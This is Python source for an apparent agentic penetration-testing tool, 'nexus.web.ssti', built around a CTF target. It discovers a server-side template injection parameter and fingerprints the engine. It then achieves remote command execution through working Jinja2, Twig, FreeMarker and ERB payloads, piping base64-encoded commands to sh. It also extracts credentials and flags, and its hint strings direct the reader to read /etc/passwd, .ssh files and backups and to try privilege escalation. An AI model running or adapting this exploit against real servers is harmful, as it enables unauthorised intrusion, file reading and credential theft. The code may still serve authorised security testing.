"""Durable ``nexus.web.ssti`` handler: find the injectable parameter, prove RCE.

Theseus (2026-10-30) is served by a Flask app whose index page ends with a
scytale cipher ("MAKE USE OF THE KEY") and whose only route renders
``request.args.get("key")`` with ``render_template_string``. Nothing in the
catalog could do the three things that turn that page into a shell:

* name the parameter -the hint is a transposition, not a parameter list, and
  ``nexus.web.request`` needs the URL already built-;
* decide between XSS, SQLi and a template engine when the value is reflected;
* turn the expression into a command without hand-encoding Jinja2 payloads.

This tool answers all three deterministically:

* ``action="detect"`` sends an arithmetic canary (``7351*3`` -> ``22053``)
  through every candidate parameter -the ones already in the URL plus a
  built-in list, so no wordlist can be invented- and reports the parameter and
  engine that *evaluated* it. A reflected value echoes the expression, never
  the product, so a plain reflection is not a false positive;
* ``action="exec"`` runs a command through the engine's own object graph
  (Jinja2 ``config``/``cycler`` globals, Twig filters, FreeMarker ``Execute``,
  ERB backticks) wrapped in nonce markers;
* ``action="read_file"`` is the same path with ``cat``, because the first thing
  every SSTI is asked for is a file (``Minos_Flag``, ``shadow.bak``...).

The command travels base64-encoded inside the payload: the alphabet has no
quotes, no braces and no spaces, so no engine-specific escaping is needed.

Verification is deterministic: ``exec``/``read_file`` is only ``verified`` when
both nonce markers came back, which proves the engine *ran* the command instead
of echoing the payload.
"""

from __future__ import annotations

import base64
import json
import os
import re
import shlex
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
from uuid import uuid4

from nexus_core.kernel.models import RiskLevel, RunContext, ToolDefinition, ToolResult
from nexus_core.kernel.sandbox import sandbox_for_environment

from ._exec import run_in_sandbox
from ._loot import credentials_in_text

SSTI_TOOL_ID = "nexus.web.ssti"
SSTI_ALLOWED_PROGRAMS = ("python3",)
SSTI_DEFAULT_TIMEOUT_SECONDS = 20
SSTI_MAX_TIMEOUT_SECONDS = 120
SSTI_MAX_CANDIDATES = 60
#: Discovery probes are cheap: a page that answers in seconds for 60 candidates
#: must not spend the run's turn on the 20 s ceiling of a single request.
SSTI_PROBE_REQUEST_SECONDS = 8
SSTI_MAX_BODY_CHARS = 131_072
SSTI_DETECT_BODY_CHARS = 4_000
SSTI_MAX_OUTPUT_CHARS = 16_000
SSTI_MAX_COMMAND_CHARS = 1024
SSTI_MAX_PATH_CHARS = 512

#: An arithmetic canary whose product cannot appear in page markup, so a
#: reflected value ("You searched for {{7351*3}}") is not mistaken for a hit.
SSTI_CANARY_EXPR = "7351*3"
SSTI_CANARY_VALUE = "22053"
#: Jinja2 repeats a string; Twig raises on ``int * string``. Two engines share
#: the ``{{ }}`` syntax, so this is the discriminator that names the payload set.
SSTI_REPEAT_EXPR = "7*'7'"
SSTI_REPEAT_VALUE = "7777777"

SSTI_ACTIONS = ("detect", "exec", "read_file")
SSTI_ENGINES = ("auto", "jinja2", "twig", "freemarker", "erb")
#: Engines tried by the discovery pass. ``jinja2`` covers the ``{{ }}`` syntax
#: Twig shares; the repeat canary decides between them afterwards.
SSTI_PROBE_ENGINES = ("jinja2", "freemarker", "erb")

#: Query names worth probing when the page does not name one. ``key`` is first
#: because that is the measured Theseus parameter; the rest are the names Flask,
#: Django, Rails and plain PHP scripts give a value they render.
SSTI_COMMON_PARAMS: tuple[str, ...] = (
    "key",
    "q",
    "s",
    "search",
    "query",
    "page",
    "name",
    "id",
    "user",
    "username",
    "title",
    "content",
    "message",
    "msg",
    "text",
    "input",
    "value",
    "data",
    "cmd",
    "exec",
    "command",
    "run",
    "debug",
    "test",
    "view",
    "template",
    "tpl",
    "theme",
    "file",
    "path",
    "dir",
    "url",
    "uri",
    "redirect",
    "next",
    "callback",
    "action",
    "op",
    "do",
    "mode",
    "type",
    "format",
    "output",
    "render",
    "html",
    "lang",
    "locale",
    "filter",
    "sort",
    "order",
    "cat",
    "category",
    "tag",
    "preview",
    "email",
    "code",
    "note",
    "flag",
)

#: One payload per engine, tried in order until the nonce markers come back.
#: ``CMD`` is replaced by ``echo <base64>|base64 -d|sh``, so the payload never
#: has to escape the operator's command.
SSTI_EXEC_PAYLOADS: dict[str, tuple[str, ...]] = {
    "jinja2": (
        "{{config.__class__.__init__.__globals__['os'].popen('CMD').read()}}",
        "{{cycler.__init__.__globals__.os.popen('CMD').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('CMD').read()}}",
    ),
    "twig": (
        "{{['CMD']|filter('system')}}",
        "{{_self.env.registerUndefinedFilterCallback('system')}}"
        "{{_self.env.getFilter('CMD')}}",
        "{{['CMD']|map('system')|join}}",
    ),
    "freemarker": (
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sh -c \'CMD\'")}',
    ),
    "erb": ("<%= `CMD` %>",),
}

#: Client executed in the sandbox. argv after ``-c``: one JSON payload with the
#: request list, the timeout and the TLS switch. The client only *fetches*: the
#: interpretation (canary, engine, markers) stays in the handler so it is tested
#: without network.
SSTI_CLIENT_SCRIPT = r"""
import json, ssl, sys, time, urllib.error, urllib.request


def _fetch(spec, default_timeout, insecure):
    url = str(spec.get("url") or "")
    method = str(spec.get("method") or "GET").upper()
    headers = {str(key): str(value) for key, value in (spec.get("headers") or {}).items()}
    data = spec.get("body")
    body = data.encode("utf-8") if isinstance(data, str) else None
    keep = int(spec.get("keep") or 4000)
    tokens = [str(token) for token in (spec.get("tokens") or [])]
    timeout = float(spec.get("timeout") or default_timeout)
    request = urllib.request.Request(url, data=body, headers=headers, method=method)
    context = None
    if insecure:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
    started = time.time()
    try:
        with urllib.request.urlopen(request, timeout=timeout, context=context) as response:
            status = int(getattr(response, "status", 0) or 0)
            raw = response.read(4_000_000) or b""
            location = response.headers.get("Location", "") if response.headers else ""
    except urllib.error.HTTPError as exc:
        status = int(exc.code)
        raw = exc.read(4_000_000) or b""
        location = exc.headers.get("Location", "") if exc.headers else ""
    except Exception as exc:
        return {
            "url": url,
            "error": "%s: %s" % (type(exc).__name__, exc),
            "tokens": {token: False for token in tokens},
        }
    text = raw.decode("utf-8", "replace")
    return {
        "url": url,
        "status": status,
        "length": len(raw),
        "elapsed": round(time.time() - started, 3),
        "location": location,
        "body": text[:keep],
        "tokens": {token: token in text for token in tokens},
    }


def main():
    payload = json.loads(sys.argv[1])
    insecure = bool(payload.get("insecure"))
    default_timeout = float(payload.get("timeout") or 15)
    responses = [
        _fetch(spec, default_timeout, insecure)
        for spec in (payload.get("requests") or [])
    ]
    print(json.dumps({"ok": True, "responses": responses}))


main()
"""

FLAG_RE = re.compile(r"[A-Za-z0-9_]{2,}\{[^}\n]{1,160}\}")


def _wrap(engine: str, expression: str) -> str:
    """Wrap ``expression`` in the syntax of ``engine``."""
    if engine == "erb":
        return f"<%= {expression} %>"
    if engine == "freemarker":
        return "$" + "{" + expression + "}"
    return "{{" + expression + "}}"


def _candidate_params(url: str, explicit: str, extra: list[str]) -> list[str]:
    """Parameters to probe: explicit, the URL's own, then the built-in names."""
    names: list[str] = []

    def add(name: str) -> None:
        text = str(name or "").strip()
        if text and text not in names and len(names) < SSTI_MAX_CANDIDATES:
            names.append(text)

    if explicit:
        add(explicit)
        return names
    for name, _value in parse_qsl(urlsplit(url).query, keep_blank_values=True):
        add(name)
    for name in extra:
        add(name)
    for name in SSTI_COMMON_PARAMS:
        add(name)
    return names


def _request_spec(
    *,
    url: str,
    param: str,
    value: str,
    method: str,
    headers: dict[str, str],
    tokens: list[str],
    keep: int = SSTI_DETECT_BODY_CHARS,
    timeout: float | None = None,
) -> dict[str, Any]:
    """Build one fetch spec: the value travels as a query string or a form body."""
    parts = urlsplit(url)
    if method == "POST":
        body = urlencode({param: value})
        target = url
        fields = dict(headers)
        if not any(key.lower() == "content-type" for key in fields):
            fields["Content-Type"] = "application/x-www-form-urlencoded"
    else:
        query = [
            (key, item)
            for key, item in parse_qsl(parts.query, keep_blank_values=True)
            if key != param
        ]
        query.append((param, value))
        body = None
        target = urlunsplit(
            (parts.scheme, parts.netloc, parts.path, urlencode(query), parts.fragment)
        )
        fields = dict(headers)
    spec: dict[str, Any] = {
        "url": target,
        "method": method,
        "headers": fields,
        "body": body,
        "keep": keep,
        "tokens": tokens,
    }
    if timeout is not None:
        spec["timeout"] = timeout
    return spec


async def _send(
    specs: list[dict[str, Any]], *, timeout_seconds: int, insecure: bool,
    per_request: int | None = None,
) -> tuple[list[dict[str, Any]] | None, str | None]:
    """Fetch every spec in one sandboxed client run; returns (responses, error).

    The requests run sequentially inside one client process, so the sandbox
    deadline is the sum of their per-request timeouts (capped), not a guess: a
    discovery pass of 60 candidates at the 20 s ceiling would otherwise be
    killed before the last one is sent.
    """
    default = float(per_request or timeout_seconds)
    for spec in specs:
        spec.setdefault("timeout", default)
    overall = min(900.0, 20 + sum(float(spec["timeout"]) for spec in specs))
    payload = {"requests": specs, "timeout": timeout_seconds, "insecure": insecure}
    argv = ["python3", "-c", SSTI_CLIENT_SCRIPT, json.dumps(payload)]
    workspace_root = os.getenv("NEXUS_WORKSPACE_ROOT", os.getcwd())
    sandbox = sandbox_for_environment(workspace_root, allowed_programs=SSTI_ALLOWED_PROGRAMS)
    try:
        result = await run_in_sandbox(
            sandbox,
            argv,
            timeout_seconds=overall,
            image_env="NEXUS_HTTP_IMAGE",
            default_image="python:3.12-alpine",
        )
    except (OSError, RuntimeError, ValueError) as exc:
        return None, f"{type(exc).__name__}: {exc}"
    for line in reversed((result.stdout or "").splitlines()):
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            parsed = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(parsed, dict) and isinstance(parsed.get("responses"), list):
            return list(parsed["responses"]), None
    tail = (result.stderr or result.stdout or "").strip()[-400:]
    return None, f"ssti client did not return a result: {tail}"


def _hit(response: dict[str, Any] | None, token: str) -> bool:
    """Whether ``token`` arrived in ``response`` (canary product or marker)."""
    if not response:
        return False
    tokens = response.get("tokens") or {}
    return bool(tokens.get(token))


def _extract_block(body: str, nonce: str) -> str | None:
    """Text between the two nonce markers, or ``None`` when they did not arrive."""
    start = body.find(nonce)
    if start < 0:
        return None
    start += len(nonce)
    end = body.find(nonce, start)
    if end < 0:
        return None
    return body[start:end].strip("\r\n")


async def _discriminate(
    *, url: str, param: str, method: str, headers: dict[str, str], insecure: bool,
    timeout_seconds: int, engine_hint: str | None = None,
) -> tuple[str | None, list[dict[str, Any]]]:
    """Name the engine for ``param``; returns (engine, evidence rows)."""
    order = [engine_hint] if engine_hint and engine_hint != "auto" else list(SSTI_PROBE_ENGINES)
    evidence: list[dict[str, Any]] = []
    for engine in order:
        if engine is None:
            continue
        expression = SSTI_CANARY_EXPR
        spec = _request_spec(
            url=url, param=param, value=_wrap(engine, expression), method=method,
            headers=headers, tokens=[SSTI_CANARY_VALUE],
        )
        responses, error = await _send(
            [spec], timeout_seconds=timeout_seconds, insecure=insecure,
            per_request=SSTI_PROBE_REQUEST_SECONDS,
        )
        if error or not responses:
            evidence.append({"engine": engine, "error": error or "no response"})
            continue
        response = responses[0]
        evaluated = _hit(response, SSTI_CANARY_VALUE)
        evidence.append(
            {
                "engine": engine,
                "status": response.get("status"),
                "length": response.get("length"),
                "evaluated": evaluated,
            }
        )
        if not evaluated:
            continue
        if engine != "jinja2":
            return engine, evidence
        # ``{{ }}`` is shared with Twig: the repeat separates them.
        repeat_spec = _request_spec(
            url=url, param=param, value=_wrap("jinja2", SSTI_REPEAT_EXPR), method=method,
            headers=headers, tokens=[SSTI_REPEAT_VALUE],
        )
        repeats, repeat_error = await _send(
            [repeat_spec], timeout_seconds=timeout_seconds, insecure=insecure,
            per_request=SSTI_PROBE_REQUEST_SECONDS,
        )
        if repeat_error or not repeats:
            evidence.append({"engine": "jinja2", "repeat_error": repeat_error})
            return "jinja2", evidence
        if _hit(repeats[0], SSTI_REPEAT_VALUE):
            evidence.append({"engine": "jinja2", "repeat": True})
            return "jinja2", evidence
        evidence.append({"engine": "twig", "repeat": False, "shared_syntax": True})
        return "twig", evidence
    return None, evidence


async def _detect(
    *,
    url: str,
    param: str,
    extra_params: list[str],
    method: str,
    headers: dict[str, str],
    insecure: bool,
    timeout_seconds: int,
) -> tuple[dict[str, Any] | None, list[dict[str, Any]]]:
    """Find the parameter a template engine evaluates; returns (hit, evidence)."""
    names = _candidate_params(url, param, extra_params)
    if not names:
        return None, []
    evidence: list[dict[str, Any]] = []
    if param:
        engine, rows = await _discriminate(
            url=url, param=param, method=method, headers=headers, insecure=insecure,
            timeout_seconds=timeout_seconds,
        )
        evidence.extend(rows)
        if engine is None:
            return None, evidence
        return {"param": param, "engine": engine, "discovered": False}, evidence

    combined = "|".join(_wrap(engine, SSTI_CANARY_EXPR) for engine in SSTI_PROBE_ENGINES)
    specs = [
        _request_spec(
            url=url, param=name, value=combined, method=method, headers=headers,
            tokens=[SSTI_CANARY_VALUE],
        )
        for name in names
    ]
    responses, error = await _send(
        specs, timeout_seconds=timeout_seconds, insecure=insecure,
        per_request=SSTI_PROBE_REQUEST_SECONDS,
    )
    if error or not responses:
        return None, [{"error": error or "no response"}]
    hits: list[str] = []
    for name, response in zip(names, responses):
        evaluated = _hit(response, SSTI_CANARY_VALUE)
        evidence.append(
            {
                "param": name,
                "status": (response or {}).get("status"),
                "length": (response or {}).get("length"),
                "evaluated": evaluated,
                "error": (response or {}).get("error"),
            }
        )
        if evaluated:
            hits.append(name)
    if not hits:
        return None, evidence
    engine, rows = await _discriminate(
        url=url, param=hits[0], method=method, headers=headers, insecure=insecure,
        timeout_seconds=timeout_seconds,
    )
    evidence.extend(rows)
    if engine is None:
        return None, evidence
    return {
        "param": hits[0],
        "engine": engine,
        "discovered": True,
        "also_evaluated": hits[1:],
        "probed": len(names),
    }, evidence


async def _execute(
    *,
    url: str,
    param: str,
    engine: str,
    command: str,
    method: str,
    headers: dict[str, str],
    insecure: bool,
    timeout_seconds: int,
) -> dict[str, Any]:
    """Run ``command`` through ``engine`` and return output plus its evidence."""
    nonce = f"nexus{uuid4().hex[:12]}"
    wrapped = f"echo {nonce}; ( {command} ); echo __NEXUS_RC=$?; echo {nonce}"
    encoded = base64.b64encode(wrapped.encode("utf-8")).decode("ascii")
    shell = f"echo {encoded}|base64 -d|sh"
    attempts: list[dict[str, Any]] = []
    for template in SSTI_EXEC_PAYLOADS.get(engine, ()):
        payload = template.replace("CMD", shell)
        spec = _request_spec(
            url=url, param=param, value=payload, method=method, headers=headers,
            tokens=[nonce], keep=SSTI_MAX_BODY_CHARS,
        )
        responses, error = await _send([spec], timeout_seconds=timeout_seconds, insecure=insecure)
        if error or not responses:
            attempts.append({"payload": template[:120], "error": error or "no response"})
            continue
        response = responses[0]
        block = _extract_block(str(response.get("body") or ""), nonce)
        attempts.append(
            {
                "payload": template[:120],
                "status": response.get("status"),
                "executed": block is not None,
            }
        )
        if block is None:
            continue
        returncode = None
        match = re.search(r"__NEXUS_RC=(\d+)", block)
        if match:
            returncode = int(match.group(1))
        output = block.replace(match.group(0), "").strip("\r\n") if match else block
        return {"output": output, "returncode": returncode, "attempts": attempts}
    return {"output": None, "returncode": None, "attempts": attempts}


def ssti_definition(tenant_id: str = "system") -> ToolDefinition:
    """Return the durable ToolDefinition for ``nexus.web.ssti``."""
    return ToolDefinition(
        tool_id=SSTI_TOOL_ID,
        effect="exploit",
        name="SSTI discovery and exploitation",
        tenant_id=tenant_id,
        description=(
            "SSTI: descubre QUÉ parámetro evalúa la plantilla del servidor (si no "
            "lo das, prueba los de la URL y una lista interna), identifica el motor "
            "(Jinja2/Twig/FreeMarker/ERB) con una canaria aritmética y ejecuta un "
            "comando o lee un fichero con el payload de ese motor. Uso típico: "
            "?key={{7*7}} devuelve 49. Verifica con la salida real (marcadores)."
        ),
        input_schema={
            "type": "object",
            "properties": {
                "url": {"type": "string", "minLength": 3, "maxLength": 2048},
                "param": {
                    "type": "string",
                    "pattern": r"^[A-Za-z0-9_.\[\]-]{1,64}$",
                    "description": (
                        "Parámetro a inyectar. OMÍTELO para que la tool descubra "
                        "cuál evalúa la plantilla (p. ej. `key` en Theseus)."
                    ),
                },
                "params": {
                    "type": "array",
                    "items": {"type": "string", "pattern": r"^[A-Za-z0-9_.\[\]-]{1,64}$"},
                    "maxItems": 40,
                    "description": "Nombres extra a probar en el descubrimiento.",
                },
                "method": {"type": "string", "enum": ["GET", "POST"]},
                "action": {"type": "string", "enum": list(SSTI_ACTIONS)},
                "engine": {"type": "string", "enum": list(SSTI_ENGINES)},
                "command": {
                    "type": "string",
                    "maxLength": SSTI_MAX_COMMAND_CHARS,
                    "description": "Comando a ejecutar (action=exec). Por defecto `id`.",
                },
                "path": {
                    "type": "string",
                    "maxLength": SSTI_MAX_PATH_CHARS,
                    "description": "Fichero a leer (action=read_file).",
                },
                "headers": {
                    "type": "object",
                    "maxProperties": 20,
                    "additionalProperties": {"type": "string", "maxLength": 4096},
                },
                "insecure": {"type": "boolean"},
                "timeout_seconds": {
                    "type": "integer",
                    "minimum": 5,
                    "maximum": SSTI_MAX_TIMEOUT_SECONDS,
                },
            },
            "required": ["url"],
            "additionalProperties": False,
        },
        risk=RiskLevel.HIGH,
        required_permissions=[f"execute:tool:{SSTI_TOOL_ID}"],
        timeout_seconds=300,
        max_output_bytes=2_000_000,
        scope_target_field="url",
        scope_required=True,
    )


def _validate_url(value: Any) -> str:
    text = str(value or "").strip()
    if not text:
        raise ValueError("url is required")
    parts = urlsplit(text)
    if parts.scheme not in {"http", "https"}:
        raise ValueError(f"url scheme must be http or https: {text!r}")
    if not parts.netloc:
        raise ValueError(f"url has no host: {text!r}")
    if any(ord(char) < 0x20 or ord(char) == 0x7F for char in text):
        raise ValueError("url contains control characters")
    return text


def _validate_name(value: Any, field: str) -> str:
    text = str(value or "").strip()
    if not text:
        return ""
    if not re.fullmatch(r"[A-Za-z0-9_.\[\]-]{1,64}", text):
        raise ValueError(f"{field} is not a valid parameter name: {text!r}")
    return text


def _validate_command(value: Any) -> str:
    command = str(value if value is not None else "id")
    if not command.strip():
        raise ValueError("command is required")
    if len(command) > SSTI_MAX_COMMAND_CHARS:
        raise ValueError("command is too long")
    if any(ord(char) < 0x20 for char in command):
        raise ValueError("command contains control characters")
    return command


def _validate_path(value: Any) -> str:
    path = str(value or "").strip()
    if not path:
        raise ValueError("path is required for action=read_file")
    if len(path) > SSTI_MAX_PATH_CHARS:
        raise ValueError("path is too long")
    if path.startswith("-"):
        raise ValueError("path cannot start with '-'")
    if any(ord(char) < 0x20 for char in path):
        raise ValueError("path contains control characters")
    return path


def _validate_headers(value: Any) -> dict[str, str]:
    if not value:
        return {}
    if not isinstance(value, dict) or len(value) > 20:
        raise ValueError("headers must be an object with at most 20 entries")
    headers: dict[str, str] = {}
    for key, item in value.items():
        name = str(key)
        text = str(item)
        if not name or any(ord(char) < 0x20 or ord(char) == 0x7F for char in name + text):
            raise ValueError("header names and values must not contain control characters")
        headers[name] = text
    return headers


def _next_steps(*, hit: dict[str, Any] | None, verified: bool, engine: str) -> list[str]:
    if verified:
        steps = [
            "Tienes ejecución remota de comandos: lee /etc/passwd, los home del "
            "usuario del servicio (notas, .ssh, backups) y registra cada hallazgo.",
        ]
        if engine == "jinja2":
            steps.append(
                "El proceso corre como el usuario del servicio: antes de escalar, "
                "cat /home/<user>/* y sudo -l vía nexus.post.ssh_exec si hay SSH."
            )
        return steps
    if hit is None:
        return [
            "Ningún parámetro evaluó {{7351*3}}: la página puede no ser SSTI, o el "
            "valor va por POST/ruta/cabecera. Prueba method=POST, otro parámetro "
            "(params=[...]) o revisa el HTML en busca de un formulario.",
        ]
    return [
        f"El parámetro {hit.get('param')} evalúa plantillas pero el payload de "
        f"{engine} no devolvió marcadores: prueba otro engine (engine=\"twig\", "
        '"jinja2", "freemarker", "erb") o confirma con action=detect.',
    ]


async def ssti_handler(arguments: dict[str, Any], context: RunContext) -> ToolResult:
    """Detect, exploit or read a file through a server-side template injection."""
    from nexus_core.kernel.schema_validation import validate

    validate(arguments, ssti_definition().input_schema)
    url = _validate_url(arguments.get("url"))
    param = _validate_name(arguments.get("param"), "param")
    method = str(arguments.get("method") or "GET").strip().upper()
    if method not in {"GET", "POST"}:
        raise ValueError(f"http method is not allowed: {method!r}")
    action = str(arguments.get("action") or "detect").strip().lower()
    if action not in SSTI_ACTIONS:
        raise ValueError(f"action is not allowed: {action!r}")
    engine_arg = str(arguments.get("engine") or "auto").strip().lower()
    if engine_arg not in SSTI_ENGINES:
        raise ValueError(f"engine is not allowed: {engine_arg!r}")
    headers = _validate_headers(arguments.get("headers"))
    extra = [_validate_name(item, "params") for item in (arguments.get("params") or [])]
    extra = [item for item in extra if item]
    insecure = bool(arguments.get("insecure", False))
    requested = arguments.get("timeout_seconds")
    timeout_seconds = min(
        SSTI_MAX_TIMEOUT_SECONDS,
        max(5, int(requested) if requested else SSTI_DEFAULT_TIMEOUT_SECONDS),
    )
    command = ""
    if action == "exec":
        command = _validate_command(arguments.get("command"))
    elif action == "read_file":
        command = f"cat {shlex.quote(_validate_path(arguments.get('path')))}"

    evidence: dict[str, Any] = {
        "url": url, "method": method, "action": action, "param": param or None,
        "engine": engine_arg,
    }

    hit: dict[str, Any] | None = None
    if param and engine_arg != "auto" and action != "detect":
        hit = {"param": param, "engine": engine_arg, "discovered": False}
    else:
        hit, rows = await _detect(
            url=url, param=param, extra_params=extra, method=method, headers=headers,
            insecure=insecure, timeout_seconds=timeout_seconds,
        )
        evidence["probes"] = rows[-8:]
        if hit is not None and engine_arg != "auto":
            hit["engine"] = engine_arg

    if hit is None:
        return ToolResult(
            output={"error": "no injectable parameter found", "url": url,
                    "next_steps": _next_steps(hit=None, verified=False, engine=engine_arg)},
            verified=False,
            verification_method="ssti_not_detected",
            evidence=evidence,
        )

    engine = str(hit.get("engine") or engine_arg)
    evidence.update({"param": hit.get("param"), "engine": engine,
                     "discovered": hit.get("discovered")})
    if action == "detect":
        return ToolResult(
            output={
                "url": url,
                "parameter": hit.get("param"),
                "engine": engine,
                "discovered": bool(hit.get("discovered")),
                "also_evaluated": hit.get("also_evaluated") or [],
                "next_steps": [
                    f"Inyecta en `{hit.get('param')}` con engine={engine}: "
                    f'action="exec", command="id" para demostrar RCE.'
                ],
            },
            verified=True,
            verification_method="ssti_engine_evaluated",
            evidence=evidence,
        )

    execution = await _execute(
        url=url, param=str(hit.get("param")), engine=engine, command=command,
        method=method, headers=headers, insecure=insecure,
        timeout_seconds=timeout_seconds,
    )
    evidence["attempts"] = execution["attempts"]
    output = execution["output"]
    if output is None:
        return ToolResult(
            output={
                "error": "the engine did not run the command",
                "url": url,
                "parameter": hit.get("param"),
                "engine": engine,
                "attempts": execution["attempts"],
                "next_steps": _next_steps(hit=hit, verified=False, engine=engine),
            },
            verified=False,
            verification_method="ssti_no_output",
            evidence=evidence,
        )

    text = str(output)
    flag = FLAG_RE.search(text)
    credentials = credentials_in_text(text, f"{url}?{hit.get('param')}")
    evidence.update(
        {
            "command": command,
            "returncode": execution["returncode"],
            "flag": flag.group(0) if flag else None,
            "output_tail": text[-2000:],
        }
    )
    return ToolResult(
        output={
            "url": url,
            "parameter": hit.get("param"),
            "engine": engine,
            "command": command,
            "output": text[:SSTI_MAX_OUTPUT_CHARS],
            "returncode": execution["returncode"],
            "flag": flag.group(0) if flag else None,
            "credentials": credentials,
            "next_steps": _next_steps(hit=hit, verified=True, engine=engine),
        },
        verified=True,
        verification_method="ssti_command_output",
        evidence=evidence,
    )


__all__ = [
    "SSTI_CLIENT_SCRIPT",
    "SSTI_COMMON_PARAMS",
    "SSTI_EXEC_PAYLOADS",
    "SSTI_TOOL_ID",
    "ssti_definition",
    "ssti_handler",
]
